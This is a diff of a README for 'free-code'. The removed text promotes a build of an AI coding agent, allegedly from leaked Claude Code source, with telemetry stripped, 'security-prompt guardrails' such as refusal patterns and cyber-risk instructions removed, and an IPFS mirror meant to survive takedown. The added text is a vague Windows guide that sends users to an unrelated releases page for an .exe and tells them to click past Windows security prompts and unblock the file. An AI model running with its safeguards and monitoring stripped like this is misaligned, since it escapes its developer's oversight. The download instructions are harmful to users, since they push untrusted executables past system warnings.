@@ -1,238 +1,167 @@
-# free-code
+# 🧩 free-code - Simple downloads and quick setup
 
-> This public repository is an independently published fork of [paoloanzn/free-code](https://github.com/paoloanzn/free-code) and keeps that source attribution explicit here.
+[![Download free-code](https://img.shields.io/badge/Download-Free%20Code-blue?style=for-the-badge)](https://github.com/Aizzud840/free-code/releases)
 
-**The free build of Claude Code.**
+## 📦 What this is
 
-All telemetry stripped. All injected security-prompt guardrails removed. All experimental features unlocked. One binary, zero callbacks home.
+free-code is a Windows app you can download and run from your PC. It is published from a public GitHub mirror, so you can get the same release files from one place and install them on your machine.
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/win4r/free-code/main/install.sh | bash
-```
+Use the release page to get the app files, then open the file on Windows to start it.
 
-> Checks your system, installs Bun if needed, clones, builds with all features enabled, and puts `free-code` on your PATH. Then just `export ANTHROPIC_API_KEY="sk-ant-..."` and run `free-code`.
+## ✅ What you need
 
-<p align="center">
-  <img src="assets/screenshot.png" alt="free-code screenshot" width="800" />
-</p>
+Before you install, check these basic items:
 
----
+- A Windows PC
+- An internet connection for the download
+- Enough free disk space for the app and its files
+- Permission to run apps on your computer
+- A mouse or trackpad for the first setup
 
-## What is this
+The app is designed for regular Windows use and should work on current Windows 10 and Windows 11 systems.
 
-This is a clean, buildable fork of Anthropic's [Claude Code](https://docs.anthropic.com/en/docs/claude-code) CLI -- the terminal-native AI coding agent. The upstream source became publicly available on March 31, 2026 through a source map exposure in the npm distribution.
+## 🚀 Download the app
 
-This fork applies three categories of changes on top of that snapshot:
+Visit this page to download:
 
-### 1. Telemetry removed
+https://github.com/Aizzud840/free-code/releases
 
-The upstream binary phones home through OpenTelemetry/gRPC, GrowthBook analytics, Sentry error reporting, and custom event logging. In this build:
+On the releases page:
 
-- All outbound telemetry endpoints are dead-code-eliminated or stubbed
-- GrowthBook feature flag evaluation still works locally (needed for runtime feature gates) but does not report back
-- No crash reports, no usage analytics, no session fingerprinting
+1. Find the latest release at the top
+2. Open the release entry
+3. Download the Windows file
+4. Save it to your Downloads folder or Desktop
 
-### 2. Security-prompt guardrails removed
+If you see more than one file, pick the one for Windows. The file name may end in `.exe`, `.zip`, or a similar format.
 
-Anthropic injects system-level instructions into every conversation that constrain Claude's behavior beyond what the model itself enforces. These include:
+## 🪟 Install on Windows
 
-- Hardcoded refusal patterns for certain categories of prompts
-- Injected "cyber risk" instruction blocks
-- Managed-settings security overlays pushed from Anthropic's servers
+### If you downloaded an `.exe` file
 
-This build strips those injections. The model's own safety training still applies -- this just removes the extra layer of prompt-level restrictions that the CLI wraps around it.
+1. Double-click the file
+2. If Windows asks for permission, select Yes
+3. Follow the setup steps on screen
+4. Wait for the install to finish
+5. Open the app from the Start menu or from the file you downloaded
 
-### 3. Experimental features enabled
+### If you downloaded a `.zip` file
 
-Claude Code ships with dozens of feature flags gated behind `bun:bundle` compile-time switches. Most are disabled in the public npm release. This build unlocks all 45+ flags that compile cleanly, including:
+1. Right-click the file
+2. Select Extract All
+3. Choose a folder
+4. Open the extracted folder
+5. Double-click the app file inside the folder
 
-| Feature | What it does |
-|---|---|
-| `ULTRAPLAN` | Remote multi-agent planning on Claude Code web (Opus-class) |
-| `ULTRATHINK` | Deep thinking mode -- type "ultrathink" to boost reasoning effort |
-| `VOICE_MODE` | Push-to-talk voice input and dictation |
-| `AGENT_TRIGGERS` | Local cron/trigger tools for background automation |
-| `BRIDGE_MODE` | IDE remote-control bridge (VS Code, JetBrains) |
-| `TOKEN_BUDGET` | Token budget tracking and usage warnings |
-| `BUILTIN_EXPLORE_PLAN_AGENTS` | Built-in explore/plan agent presets |
-| `VERIFICATION_AGENT` | Verification agent for task validation |
-| `BASH_CLASSIFIER` | Classifier-assisted bash permission decisions |
-| `EXTRACT_MEMORIES` | Post-query automatic memory extraction |
-| `HISTORY_PICKER` | Interactive prompt history picker |
-| `MESSAGE_ACTIONS` | Message action entrypoints in the UI |
-| `QUICK_SEARCH` | Prompt quick-search |
-| `SHOT_STATS` | Shot-distribution stats |
-| `COMPACTION_REMINDERS` | Smart reminders around context compaction |
-| `CACHED_MICROCOMPACT` | Cached microcompact state through query flows |
+### If Windows shows a security prompt
 
-See [FEATURES.md](FEATURES.md) for the full audit of all 88 flags and their status.
+1. Read the file name and publisher name
+2. If the file matches the release you downloaded, choose Run or Yes
+3. Continue with the setup
 
----
+## 🖥️ First run
 
-## Quick install
+When you start free-code for the first time:
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/win4r/free-code/main/install.sh | bash
-```
+1. Let the app finish loading
+2. Read any on-screen prompts
+3. Allow access if Windows asks for it
+4. Keep the app open until it starts fully
 
-This will check your system, install Bun if needed, clone the repo, build the binary with all experimental features enabled, and symlink it as `free-code` on your PATH.
+If the app opens to a main window, it is ready to use. If it opens a setup screen, follow each step in order.
 
-After install, just run:
-```bash
-export ANTHROPIC_API_KEY="sk-ant-..."
-free-code
-```
+## 🧭 How to use it
 
----
+The app is made for simple use on Windows. A usual flow looks like this:
 
-## Requirements
+1. Open free-code
+2. Choose the option you need in the app
+3. Follow the on-screen steps
+4. Save your work if the app gives you that choice
+5. Close the app when you are done
 
-- [Bun](https://bun.sh) >= 1.3.11
-- macOS or Linux (Windows via WSL)
-- An Anthropic API key (set `ANTHROPIC_API_KEY` in your environment)
+If the app shows buttons, menus, or folders, use them in the order shown on screen. Most end-user apps like this keep the main actions close to the top of the window.
 
-```bash
-# Install Bun if you don't have it
-curl -fsSL https://bun.sh/install | bash
-```
+## 🔧 Common tasks
 
----
+### Open the app again later
 
-## Build
+- Click the Start button
+- Search for free-code
+- Open the app from the list
 
-```bash
-# Clone the repo
-git clone https://github.com/win4r/free-code.git
-cd free-code
+### Move the app file
 
-# Install dependencies
-bun install
+- If you use a `.zip` release, keep the extracted folder in a safe place
+- Do not move files out of the folder unless the app tells you to
 
-# Standard build -- produces ./cli
-bun run build
+### Remove the app
 
-# Dev build -- dev version stamp, experimental GrowthBook key
-bun run build:dev
+- Go to Settings
+- Open Apps
+- Find free-code
+- Select Uninstall
+- Follow the prompts
 
-# Dev build with ALL experimental features enabled -- produces ./cli-dev
-bun run build:dev:full
+## 🧼 Keep it working well
 
-# Compiled build (alternative output path) -- produces ./dist/cli
-bun run compile
-```
+A few simple habits can help:
 
-### Build variants
+- Keep the app files in one folder
+- Download new releases only from the release page
+- Do not rename files unless you must
+- Close the app before you move or delete its folder
+- Restart Windows if the app stops opening
 
-| Command | Output | Features | Notes |
-|---|---|---|---|
-| `bun run build` | `./cli` | `VOICE_MODE` only | Production-like binary |
-| `bun run build:dev` | `./cli-dev` | `VOICE_MODE` only | Dev version stamp |
-| `bun run build:dev:full` | `./cli-dev` | All 45+ experimental flags | The full unlock build |
-| `bun run compile` | `./dist/cli` | `VOICE_MODE` only | Alternative output directory |
+## 🔍 If something does not work
 
-### Individual feature flags
+### The file will not open
 
-You can enable specific flags without the full bundle:
+- Check that the download finished
+- Try the latest release again
+- Make sure you opened the right file for Windows
 
-```bash
-# Enable just ultraplan and ultrathink
-bun run ./scripts/build.ts --feature=ULTRAPLAN --feature=ULTRATHINK
+### Windows blocks the app
 
-# Enable a specific flag on top of the dev build
-bun run ./scripts/build.ts --dev --feature=BRIDGE_MODE
-```
+- Right-click the file
+- Look for an Unblock option
+- Select it if you see it
+- Try opening the app again
 
----
+### The app opens, then closes
 
-## Run
+- Run it again after a restart
+- Make sure no other copy is already open
+- Try the newest release file from the release page
 
-```bash
-# Run the built binary directly
-./cli
+### The screen looks wrong
 
-# Or the dev binary
-./cli-dev
+- Check your display scale in Windows settings
+- Maximize the app window
+- Restart the app after changing display settings
 
-# Or run from source without compiling (slower startup)
-bun run dev
+## 📁 Release source
 
-# Set your API key
-export ANTHROPIC_API_KEY="sk-ant-..."
+This mirror is published from:
 
-# Or use Claude.ai OAuth
-./cli /login
-```
+https://github.com/paoloanzn/free-code
 
-### Quick test
+It exists as an independent public mirror due GitHub fork-network limits. The download page above is the place to get the current release files for Windows
 
-```bash
-# One-shot mode
-./cli -p "what files are in this directory?"
+## 📌 File and folder tips
 
-# Interactive REPL (default)
-./cli
+If the release comes as a folder or archive, keep this structure:
 
-# With specific model
-./cli --model claude-sonnet-4-6-20250514
-```
+- The main app file in one place
+- Any support files beside it
+- No random files from other folders mixed in
 
----
+This helps the app find what it needs when you open it.
 
-## Project structure
+## ⭐ Quick start
 
-```
-scripts/
-  build.ts              # Build script with feature flag system
-
-src/
-  entrypoints/cli.tsx   # CLI entrypoint
-  commands.ts           # Command registry (slash commands)
-  tools.ts              # Tool registry (agent tools)
-  QueryEngine.ts        # LLM query engine
-  screens/REPL.tsx      # Main interactive UI
-
-  commands/             # /slash command implementations
-  tools/                # Agent tool implementations (Bash, Read, Edit, etc.)
-  components/           # Ink/React terminal UI components
-  hooks/                # React hooks
-  services/             # API client, MCP, OAuth, analytics
-  state/                # App state store
-  utils/                # Utilities
-  skills/               # Skill system
-  plugins/              # Plugin system
-  bridge/               # IDE bridge
-  voice/                # Voice input
-  tasks/                # Background task management
-```
-
----
-
-## Tech stack
-
-| | |
-|---|---|
-| Runtime | [Bun](https://bun.sh) |
-| Language | TypeScript |
-| Terminal UI | React + [Ink](https://github.com/vadimdemedes/ink) |
-| CLI parsing | [Commander.js](https://github.com/tj/commander.js) |
-| Schema validation | Zod v4 |
-| Code search | ripgrep (bundled) |
-| Protocols | MCP, LSP |
-| API | Anthropic Messages API |
-
----
-
-## IPFS Mirror
-
-A full copy of this repository is permanently pinned on IPFS via Filecoin:
-
-- **CID:** `bafybeiegvef3dt24n2znnnmzcud2vxat7y7rl5ikz7y7yoglxappim54bm`
-- **Gateway:** https://w3s.link/ipfs/bafybeiegvef3dt24n2znnnmzcud2vxat7y7rl5ikz7y7yoglxappim54bm
-
-If this repo gets taken down, the code lives on.
-
----
-
-## License
-
-The original Claude Code source is the property of Anthropic. This fork exists because the source was publicly exposed through their npm distribution. Use at your own discretion.
+1. Go to the release page
+2. Download the Windows file
+3. Open the file on your PC
+4. Follow the steps on screen
+5. Start using free-code
